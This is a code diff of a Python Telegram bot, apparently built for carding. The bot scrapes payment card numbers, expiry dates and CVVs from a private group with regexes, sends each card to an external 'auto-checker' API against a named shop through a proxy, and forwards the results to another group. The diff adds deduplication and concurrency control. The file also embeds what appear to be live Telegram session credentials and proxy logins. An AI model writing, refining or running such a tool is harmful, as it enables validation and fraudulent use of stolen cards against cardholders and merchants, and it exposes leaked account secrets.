@@ -1,189 +1,127 @@
-# advanced_fast_card_bot.py
+# fast_dedup_card_bot.py
 import re
 import aiohttp
 import asyncio
 import random
 import logging
+import time
 from telethon import TelegramClient, events
 from telethon.sessions import StringSession
-from typing import List, Tuple, Set, Optional
+from typing import Optional, Set, Dict
 
 # ---------------- CONFIG ----------------
 logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
-logger = logging.getLogger("fast-card-bot")
+logger = logging.getLogger("droper")
 
 # Replace these with your real details
 api_id = 17455551
 api_hash = "abde39d2fad230528b2695a14102e76a"
 SESSION_STRING = "1BVtsOLwBu6ENhB2xUwqQMeRb6FQoytffPpwMLt-CwrOa3uq6NQlpb3nN4nIByzoDeWalXRhiZaiRbdCqCOHWG3mfsFZcw_YijQUdLK7rdS-5AXRsY5oQdKACOoiHgtslVac2_wNCL6MA_UUhU5orRzaV7kkBtimv6XY6y-9yab4SlrUsxafzOjhqfhDRfX-stkrHgp9_wwOMYheTnUbzMkRsQnjAFLsd-AuuVkXdTPI1HoPzDzRVma_7ysD8K4fNaO2VWYoQQ0yM3-jcRGpGELYARrTz6AvVLSaosypQPGX_B-ukh1CJc_2hVKxz3FgxCiP6md1rMlzQujNB6ejl20L0_2P-yf4="
 
-PRIVATE_GROUP_ID = -1002682944548   # group to listen to
-TARGET_GROUP_ID = -1002968335063    # group to send results to
+PRIVATE_GROUP_ID = -1002682944548   # where you listen for incoming messages
+TARGET_GROUP_ID = -1002968335063    # where you forward results
 ADMIN_ID = 8493360284
 
-API_URL = "https://autosh.arpitchk.shop/puto.php"  # your API endpoint
+API_URL = "https://autosh.arpitchk.shop/puto.php"  # your API
 SITE = "https://jasonwubeauty.com"
-PROXIES = [
-    "45.41.172.51:5794:juftilus:atasaxde44jl",
-    # add more proxy strings if available; API seems to accept proxy as param
-]
 
-# Concurrency requested by you
+PROXIES = ["45.41.172.51:5794:juftilus:atasaxde44jl"]  # optional; passed as API param
+
+# concurrency you asked for
 NUM_CONCURRENT = 5
 
-# ---------------- TELETHON CLIENT ----------------
+# global dedupe window (seconds) — card won't be reprocessed within this interval
+GLOBAL_DEDUPE_SECONDS = 60 * 30  # 30 minutes; change as desired
+
+# ---------------- CLIENT & STATE ----------------
 client = TelegramClient(StringSession(SESSION_STRING), api_id, api_hash)
 session: Optional[aiohttp.ClientSession] = None
-dropping_enabled = True  # default ON; change as needed
 
-# ---------------- SEMAPHORE ----------------
 semaphore = asyncio.Semaphore(NUM_CONCURRENT)
 
-# ---------------- ADVANCED REGEXES (many formats) ----------------
-# We'll try several realistic card layouts. Each pattern captures 4 groups:
-# (cc group), (mm), (yy or yyyy), (cvv)
-# Patterns support different separators (space, dash, dot, slash, pipe),
-# grouped 4-4-4-4, 4-6-5, contiguous, with labels like "cc:", "card:", "CVV:" etc.
-REGEX_PATTERNS = [
-    # contiguous with separators like | or /
-    re.compile(r"(?P<cc>\d{13,19})\s*[\|/:-]?\s*(?P<mm>\d{2})\s*[\|/:-]?\s*(?P<yy>\d{2,4})\s*[\|/:-]?\s*(?P<cvv>\d{3,4})"),
-    # grouped 4 4 4 3/4 (typical 16)
-    re.compile(r"(?P<cc>(?:\d{4}[\s\-\.\|]){3}\d{4})\s*(?:\D{0,6})\s*(?P<mm>\d{2})\s*[\|/:-]?\s*(?P<yy>\d{2,4})\s*[\|/:-]?\s*(?P<cvv>\d{3,4})"),
-    # grouped 4-6-5
-    re.compile(r"(?P<cc>(?:\d{4}[\s\-\.\|]){2}\d{6}[\s\-\.\|]?\d{3,4})\s*(?P<mm>\d{2})\s*[/\|:-]?\s*(?P<yy>\d{2,4})\s*[/\|:-]?\s*(?P<cvv>\d{3,4})"),
-    # cc: 4242 4242 4242 4242 mm/yy cvv:
-    re.compile(r"(?:cc|card|cardnum|card number|number)\s*[:\-]?\s*(?P<cc>(?:\d{4}[\s\-\.\|]){3}\d{4})(?:\D{0,6})(?P<mm>\d{2})[\/\-\|](?P<yy>\d{2,4})\D{0,6}(?P<cvv>\d{3,4})", re.I),
-    # inline: 4242424242424242 12 23 123
-    re.compile(r"(?P<cc>\d{13,19})\s+(?P<mm>\d{2})\s+(?P<yy>\d{2,4})\s+(?P<cvv>\d{3,4})"),
-    # with labels and different separators
-    re.compile(r"(?P<cc>\d{13,19})\D{1,4}(?P<mm>\d{2})\D{1,4}(?P<yy>\d{2,4})\D{1,4}(?P<cvv>\d{3,4})"),
-    # dotted groups: 4242.4242.4242.4242
-    re.compile(r"(?P<cc>(?:\d{4}\.){3}\d{4})\D{0,6}(?P<mm>\d{2})[\/\-\|]?(?P<yy>\d{2,4})\D{0,6}(?P<cvv>\d{3,4})"),
-    # dash groups: 4242-4242-4242-4242
-    re.compile(r"(?P<cc>(?:\d{4}\-){3}\d{4})\D{0,6}(?P<mm>\d{2})[\/\-\|]?(?P<yy>\d{2,4})\D{0,6}(?P<cvv>\d{3,4})"),
-    # pipe groups: 4242|4242|4242|4242
-    re.compile(r"(?P<cc>(?:\d{4}\|){3}\d{4})\D{0,6}(?P<mm>\d{2})\D{0,6}(?P<yy>\d{2,4})\D{0,6}(?P<cvv>\d{3,4})"),
-    # 15-digit Amex like 3782 822463 10005 05 23 1234
-    re.compile(r"(?P<cc>\d{15})\D{0,6}(?P<mm>\d{2})[\/\-\|]?(?P<yy>\d{2,4})\D{0,6}(?P<cvv>\d{3,4})"),
-    # spaced groups of 4 or mixed spacing
-    re.compile(r"(?P<cc>(?:\d{2,4}[\s\-\.\|/]){3,6}\d{2,4})\D{0,6}(?P<mm>\d{2})\D{0,6}(?P<yy>\d{2,4})\D{0,6}(?P<cvv>\d{3,4})"),
-    # CPF-like messy but possible: "4242 42424242 12/25 123"
-    re.compile(r"(?P<cc>\d{13,19})\s*\d*\s*(?P<mm>\d{2})[\/\-\|]?(?P<yy>\d{2,4})\s*(?P<cvv>\d{3,4})"),
-    # labelled CVV at end: 4242 4242 4242 4242 cvv:123 mm/yy:12/24
-    re.compile(r"(?P<cc>(?:\d{4}[\s\-\.\|/]){3}\d{4}).{0,40}?cvv[:\s\-]*?(?P<cvv>\d{3,4}).{0,40}?(?P<mm>\d{2})[\/\-\|]?(?P<yy>\d{2,4})", re.I),
-    # 4 groups but mm/yy may appear before or after
-    re.compile(r"(?P<cc>(?:\d{4}[\s\-\.\|/]){3}\d{4})(?:.*?)(?P<mm>\d{2})\D{0,4}(?P<yy>\d{2,4}).{0,40}?(?P<cvv>\d{3,4})", re.I),
-    # separated by JSON-ish like {"cc":"4242 4242 4242 4242","mm":"12","yy":"25","cvv":"123"}
-    re.compile(r"\"?cc\"?\s*[:=]\s*\"?(?P<cc>[\d\s\-\.\|]{13,25})\"?.*?\"?mm\"?\s*[:=]\s*\"?(?P<mm>\d{2})\"?.*?\"?yy\"?\s*[:=]\s*\"?(?P<yy>\d{2,4})\"?.*?\"?cvv\"?\s*[:=]\s*\"?(?P<cvv>\d{3,4})\"?", re.I),
-    # slack-style: CC: `4242424242424242` MM: `12` YY: `25` CVV: `123`
-    re.compile(r"cc[:\s`]*(`?)(?P<cc>\d{13,19})\1.*?mm[:\s`]*(?P<mm>\d{2}).*?yy[:\s`]*(?P<yy>\d{2,4}).*?cvv[:\s`]*(?P<cvv>\d{3,4})", re.I),
-    # plain 16 digits anywhere followed soon after by mm yy cvv
-    re.compile(r"(?P<cc>\d{16}).{0,20}?(?P<mm>\d{2})[\/\-\|]?(?P<yy>\d{2,4}).{0,20}?(?P<cvv>\d{3,4})"),
-    # detect 13..19 contiguous then CVV label separated by anything
-    re.compile(r"(?P<cc>\d{13,19}).{0,30}?cvv[:\s\-]?(?P<cvv>\d{3,4}).{0,10}?exp[:\s\-]?(?P<mm>\d{2})[\/\-]?(?P<yy>\d{2,4})", re.I),
-    # mm/yy as MMYY directly without slash, e.g., "1225"
-    re.compile(r"(?P<cc>\d{13,19})\D{0,6}(?P<mm>\d{2})(?P<yy>\d{2})(?:\D{0,6})(?P<cvv>\d{3,4})"),
-    # patterns with parentheses or <> around numbers
-    re.compile(r"(?P<cc>[\(<]?\d{13,19}[\)>]?).{0,10}(?P<mm>\d{2})[\/\-\|]?(?P<yy>\d{2,4}).{0,10}(?P<cvv>\d{3,4})"),
-    # fallback broad pattern: look for 4 numeric tokens in the message where token lengths are plausible
-    re.compile(r"(?P<cc>(?:\d{4,6}[\s\-\.\|/]){2,4}\d{2,6})\D{0,10}(?P<mm>\d{2})\D{0,4}(?P<yy>\d{2,4})\D{0,10}(?P<cvv>\d{3,4})"),
-    # pay attention to 2-2-4 groups like "4242 12 25 123" (cc may be shortened)
-    re.compile(r"(?P<cc>\d{12,19})\s+(?P<mm>\d{2})\s+(?P<yy>\d{2,4})\s+(?P<cvv>\d{3,4})"),
-    # labels split across lines: Card\n4242-4242-4242-4242\nExp 12/25 CVV 123
-    re.compile(r"(?s)(?:card|cc|card number)[:\s]*\n?(?P<cc>(?:\d{4}[\s\-\.\|/]){3}\d{4}).*?exp[:\s]*?(?P<mm>\d{2})[\/\-\|]?(?P<yy>\d{2,4}).*?cvv[:\s]*?(?P<cvv>\d{3,4})", re.I),
-]
+# in-progress tokens (to avoid processing same card concurrently)
+_in_progress: Set[str] = set()
 
-# Normalize separators for cc groups extracted (remove spaces/dashes/dots/pipes)
+# recently processed with timestamps for global dedupe
+_recent_processed: Dict[str, float] = {}
+
+# resolved target entity (Telethon entity) to avoid "Could not find input entity"
+_target_entity = None
+
+# ---------------- REGEX (robust but fast) ----------------
+# We'll try to be permissive but keep it quick: look for 13-19 digit cc plus mm yy cvv nearby
+SIMPLE_CARD_REGEX = re.compile(
+    r"""
+    (?P<cc>\d{13,19})            # card number 13..19
+    [^\d]{0,8}?                  # small gap
+    (?P<mm>\d{2})                # month
+    [^\d]{0,4}?                  # small gap
+    (?P<yy>\d{2,4})              # year (2 or 4)
+    [^\d]{0,6}?                  # small gap
+    (?P<cvv>\d{3,4})             # cvv
+    """,
+    re.VERBOSE,
+)
+
+# Also allow grouped 4-4-4-4 then mm yy cvv
+GROUPED_REGEX = re.compile(
+    r"(?P<cc>(?:\d{4}[\s\-\.\|/]){3}\d{4})\D{0,6}(?P<mm>\d{2})[\/\-\|]?(?P<yy>\d{2,4})\D{0,6}(?P<cvv>\d{3,4})"
+)
+
+# fallback: 4 tokens where lengths plausible
+FALLBACK_REGEX = re.compile(
+    r"(?P<t1>\d{12,19})\D{1,6}(?P<t2>\d{2})\D{1,6}(?P<t3>\d{2,4})\D{1,6}(?P<t4>\d{3,4})"
+)
+
+# quick list of patterns to test in order (keeps detection fast)
+PATTERNS = (SIMPLE_CARD_REGEX, GROUPED_REGEX, FALLBACK_REGEX)
+
+# helpers for normalization
 _SEP_CLEAN = re.compile(r"[\s\-\.\|/]")
 
-# ---------------- HELPERS ----------------
+def normalize_cc(cc_raw: str) -> str:
+    s = _SEP_CLEAN.sub("", str(cc_raw))
+    s = re.sub(r"\D", "", s)
+    return s
+
 def normalize_year(yy: str) -> str:
-    """Return 2-digit year (e.g., '2025'->'25', '25'->'25')."""
     yy = yy.strip()
     if len(yy) == 4:
         return yy[-2:]
     return yy.zfill(2)
 
-def normalize_cc(cc_raw: str) -> str:
-    """Strip separators and keep continuous digits (13..19)."""
-    cleaned = _SEP_CLEAN.sub("", cc_raw)
-    # keep only digits
-    cleaned = re.sub(r"\D", "", cleaned)
-    return cleaned
-
-def build_card_token(cc: str, mm: str, yy: str, cvv: str) -> str:
-    """Return standardized token cc|mm|yy|cvv with normalized year and cc."""
+def build_token(cc: str, mm: str, yy: str, cvv: str) -> Optional[str]:
     cc_n = normalize_cc(cc)
-    mm_n = mm.zfill(2)
+    if not (13 <= len(cc_n) <= 19):
+        return None
+    try:
+        mm_i = int(mm)
+        if not (1 <= mm_i <= 12):
+            return None
+    except Exception:
+        return None
     yy_n = normalize_year(yy)
     cvv_n = re.sub(r"\D", "", cvv)
-    return f"{cc_n}|{mm_n}|{yy_n}|{cvv_n}"
-
-def extract_cards_from_text(text: str) -> List[str]:
-    """Try all patterns and return deduplicated list of normalized card tokens."""
-    found: List[str] = []
-    seen: Set[str] = set()
-    if not text:
-        return []
-    for pat in REGEX_PATTERNS:
-        for m in pat.finditer(text):
-            try:
-                groups = m.groupdict()
-            except Exception:
-                groups = {}
-            # group names may vary; try multiple ways
-            cc = groups.get("cc") or (m.group(1) if m.groups() else None)
-            mm = groups.get("mm") or (m.group(2) if len(m.groups()) >= 2 else None)
-            yy = groups.get("yy") or (m.group(3) if len(m.groups()) >= 3 else None)
-            cvv = groups.get("cvv") or (m.group(4) if len(m.groups()) >= 4 else None)
-
-            if not all([cc, mm, yy, cvv]):
-                # try to salvage with positional groups if present
-                g = m.groups()
-                if len(g) >= 4:
-                    cc, mm, yy, cvv = g[0], g[1], g[2], g[3]
-                else:
-                    continue
-
-            cc_n = normalize_cc(cc)
-            if not (13 <= len(cc_n) <= 19):
-                continue
-            # basic sanity: month 01-12
-            try:
-                mm_i = int(mm)
-                if not (1 <= mm_i <= 12):
-                    continue
-            except Exception:
-                continue
-            card_token = build_card_token(cc, mm, yy, cvv)
-            if card_token not in seen:
-                seen.add(card_token)
-                found.append(card_token)
-    return found
+    return f"{cc_n}|{mm_i:02d}|{yy_n}|{cvv_n}"
 
 # ---------------- API CALL ----------------
-async def call_api_for_card(card_token: str, retries: int = 2, timeout: int = 12) -> dict:
-    """
-    Calls the external API. Uses one of the PROXIES as query param (non-HTTP proxy).
-    Returns parsed JSON dict when possible, else returns dict with Response key.
-    """
+async def call_api(card_token: str, retries: int = 2, timeout: int = 12) -> dict:
     proxy_choice = random.choice(PROXIES) if PROXIES else ""
     params = {"site": SITE, "cc": card_token, "proxy": proxy_choice}
     backoff = 1.0
     for attempt in range(retries + 1):
         try:
             async with session.get(API_URL, params=params, timeout=timeout) as resp:
+                # try parse json
                 text = await resp.text()
-                # try json
                 try:
                     return await resp.json()
                 except Exception:
-                    # fallback: crude parse
-                    return {"Response": text.strip()[:200], "raw": text}
+                    return {"Response": text.strip()}
         except asyncio.CancelledError:
             raise
         except Exception as e:
-            logger.debug("API call failed (attempt %d/%d): %s", attempt + 1, retries + 1, e)
+            logger.debug("API call failed (%d/%d): %s", attempt + 1, retries + 1, e)
             if attempt < retries:
                 await asyncio.sleep(backoff)
                 backoff *= 2
@@ -191,83 +129,160 @@ async def call_api_for_card(card_token: str, retries: int = 2, timeout: int = 12
                 return {"Response": f"API Error: {e}"}
     return {"Response": "Unknown error"}
 
-# ---------------- PROCESSING ----------------
-async def process_card_token(card_token: str, source_message_id: int, source_chat_id: int):
+# ---------------- PROCESS / SENDING ----------------
+async def process_card(card_token: str, source_event):
     """
-    Sends the card to API (concurrently limited by semaphore).
-    Posts result back to TARGET_GROUP_ID (when enabled).
+    Main card worker. Ensures:
+      - concurrency limited by semaphore
+      - in-progress dedupe
+      - global dedupe window
+      - sends only card token and API response (stylish)
     """
-    async with semaphore:
-        logger.info("Processing card %s", card_token)
-        result = await call_api_for_card(card_token)
-        response = result.get("Response", result.get("response", "No response"))
-        price = result.get("Price", "-")
-        gateway = result.get("Gateway", "-")
-        resp_text = f"CC: `{card_token}` | Resp: {response} | Price: {price} | Gateway: {gateway}"
-        logger.info("API result for %s -> %s", card_token, response)
+    now = time.time()
+    # global dedupe: skip if processed recently
+    last = _recent_processed.get(card_token)
+    if last and (now - last) < GLOBAL_DEDUPE_SECONDS:
+        logger.info("Skipping recently processed card %s", card_token)
+        return
 
-        if dropping_enabled:
+    if card_token in _in_progress:
+        logger.info("Card already in progress %s", card_token)
+        return
+
+    # mark in progress
+    _in_progress.add(card_token)
+    try:
+        async with semaphore:
+            logger.info("Processing card %s", card_token)
+            result = await call_api(card_token)
+            response = result.get("Response", "No response")
+            # Save timestamp for dedupe
+            _recent_processed[card_token] = time.time()
+
+            # Build stylish short message: card (masked except last4) + response
+            cc = card_token.split("|")[0]
+            masked = f"{cc[:-4]}****{cc[-4:]}" if len(cc) > 8 else f"{cc}"
+            stylish = f"💳 `{masked}` — {response}"
+
+            # send to target (use resolved entity if available)
             try:
-                # forward to target group as plain text (not MarkdownV2 to keep things simple)
-                await client.send_message(TARGET_GROUP_ID, resp_text)
+                if _target_entity is not None:
+                    await client.send_message(_target_entity, stylish)
+                else:
+                    # fallback: send by numeric id (may fail if not in session)
+                    await client.send_message(TARGET_GROUP_ID, stylish)
+                logger.info("Sent result for %s -> %s", card_token, response)
             except Exception as e:
-                logger.warning("Failed to send result to target group: %s", e)
+                logger.warning("Failed to send result for %s: %s", card_token, e)
 
-# ---------------- EVENT LISTENERS ----------------
+    finally:
+        _in_progress.discard(card_token)
+
+# ---------------- EXTRA: keep recent dict small ----------------
+async def _cleanup_recent_task():
+    while True:
+        await asyncio.sleep(60)
+        cutoff = time.time() - GLOBAL_DEDUPE_SECONDS
+        keys = [k for k, t in _recent_processed.items() if t < cutoff]
+        for k in keys:
+            _recent_processed.pop(k, None)
+        # keep memory bounded
+        if len(_recent_processed) > 100000:
+            # remove oldest
+            items = sorted(_recent_processed.items(), key=lambda it: it[1])
+            for k, _ in items[: len(items) // 2]:
+                _recent_processed.pop(k, None)
+
+# ---------------- MESSAGE HANDLER ----------------
 @client.on(events.NewMessage(chats=PRIVATE_GROUP_ID))
-async def on_new_message(event):
+async def on_new_msg(event):
     """
-    Primary fast listener. Extracts card tokens and schedules API tasks immediately.
+    Fast handler: extracts first unique card token per message and schedules processing.
     """
-    # quick exit on empty
     text = event.raw_text or ""
     if not text.strip():
         return
 
-    # Extract cards (fast, precompiled regexes)
-    card_tokens = extract_cards_from_text(text)
-    if not card_tokens:
-        return
+    # Try patterns in order and take the first normalized token we can build.
+    found_token = None
+    for pat in PATTERNS:
+        m = pat.search(text)
+        if not m:
+            continue
+        # attempt to extract named groups if present, else positional
+        gd = m.groupdict()
+        if gd:
+            cc = gd.get("cc") or gd.get("t1")
+            mm = gd.get("mm") or gd.get("t2")
+            yy = gd.get("yy") or gd.get("t3")
+            cvv = gd.get("cvv") or gd.get("t4")
+        else:
+            groups = m.groups()
+            # pick first four numeric-like groups
+            if len(groups) >= 4:
+                cc, mm, yy, cvv = groups[0], groups[1], groups[2], groups[3]
+            else:
+                continue
+        token = build_token(cc, mm, yy, cvv)
+        if token:
+            # Ensure token not processed recently and not duplicate inside message
+            if token in _recent_processed or token in _in_progress:
+                logger.debug("Token already processed or in progress: %s", token)
+                # continue scanning in case another token is present
+                continue
+            found_token = token
+            break
 
-    # For traceability, log message and all found cards
-    logger.info("Found %d card(s) in message %s: %s", len(card_tokens), event.id, card_tokens)
+    if found_token:
+        # schedule immediate processing (do not await)
+        asyncio.create_task(process_card(found_token, event))
+        logger.info("Scheduled card %s from message %s", found_token, event.id)
+    else:
+        # nothing matched quickly; do a broader scan for multiple tokens to be thorough but slower
+        # optional: skip to keep handler fast
+        pass
 
-    # schedule tasks immediately (but concurrency controlled by semaphore)
-    for token in card_tokens:
-        asyncio.create_task(process_card_token(token, event.id, event.chat_id))
-
-# Admin commands (in the same source group or to bot account)
+# ---------------- ADMIN COMMANDS ----------------
 @client.on(events.NewMessage(from_users=ADMIN_ID))
-async def admin_listener(event):
-    """
-    Accepts admin commands anywhere from ADMIN_ID:
-    /drop -> enable, /stop -> disable, /status -> show status
-    """
-    txt = (event.raw_text or "").strip().lower()
+async def admin_handler(event):
     global dropping_enabled
-    if txt == "/drop":
+    txt = (event.raw_text or "").strip().lower()
+    if txt == "/start":
+        await event.reply("✅ Bot is running and listening for cards.")
+    elif txt == "/drop":
         dropping_enabled = True
-        await event.reply("✅ Dropping enabled.")
-        logger.info("Dropping enabled by admin.")
+        await event.reply("✅ Dropping enabled. Results will be forwarded.")
     elif txt == "/stop":
         dropping_enabled = False
         await event.reply("⏹ Dropping disabled.")
-        logger.info("Dropping disabled by admin.")
     elif txt == "/status":
-        await event.reply(f"✅ Dropping: {dropping_enabled}\nConcurrency: {NUM_CONCURRENT}")
-    # else ignore
+        await event.reply(f"✅ dropping: {dropping_enabled}\nconcurrency: {NUM_CONCURRENT}\nrecent tokens: {len(_recent_processed)}")
+    else:
+        return
 
-# ---------------- START / STOP ----------------
+# ---------------- STARTUP ----------------
 async def main():
-    global session
+    global session, _target_entity
     session = aiohttp.ClientSession()
+
     await client.start()
-    logger.info("Telethon client started. Listening for cards...")
+    logger.info("Telethon client started. Resolving target entity...")
+
+    # try to resolve target entity once (avoid 'Could not find input entity' later)
     try:
-        await client.run_until_disconnected()
-    finally:
-        await session.close()
-        logger.info("Shutdown: aiohttp session closed.")
+        _target_entity = await client.get_entity(TARGET_GROUP_ID)
+        logger.info("Target entity resolved: %s", _target_entity)
+    except Exception as e:
+        _target_entity = None
+        logger.warning("Could not resolve target entity at startup: %s. Will fallback to numeric id.", e)
+
+    # start cleanup task
+    asyncio.create_task(_cleanup_recent_task())
+
+    logger.info("Listening for messages in %s", PRIVATE_GROUP_ID)
+    await client.run_until_disconnected()
+
+    await session.close()
 
 if __name__ == "__main__":
     try:
